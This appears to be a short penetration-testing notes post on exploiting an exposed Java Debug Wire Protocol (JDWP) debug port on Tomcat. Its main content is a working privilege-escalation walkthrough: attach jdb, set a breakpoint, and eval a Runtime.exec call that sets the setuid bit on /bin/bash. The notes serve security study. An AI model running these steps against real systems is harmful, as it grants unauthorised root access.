---
layout: post
title: Java Debug Wire Protocol (JDWP)
description: Java Debug Wire Protocol (JDWP)
summary: Java Debug Wire Protocol (JDWP)
tags: [java,enum]
minute: 1
---
## Startup
This is included on tomcat startup parameters. Example.

```
/usr/bin/java -Djava.util.logging.config.file=/opt/apache-tomcat-
9.0.27/conf/logging.properties [...redacted...]
-agentlib:jdwp=transport=dt_socket,address=localhost:8000,server=y,suspend=n [...redacted...]
```

## Attacks
* Privesc RCE if tomcat is running as root - this finds the `java.lang.Runtime.getRuntime()` to invoke `exec()` passing a string object

## Manual Exploitation of RCE
```bash
jdb -attach 127.0.0.1:8000
> stop in javax.GenericServlet.init()
> Set deferred breakpoint javax.servlet.GenericServlet.init()
main[1] eval new java.lang.Runtime().exec("chmod +s /bin/bash")
```

## Tips
* If exploit is not working, ensure that tomcat is hitting a breakpoint. For example restart tomcat.

## References
* [Hacktricks - Pentesting JDWP](https://book.hacktricks.xyz/pentesting/pentesting-jdwp-java-debug-wire-protocol)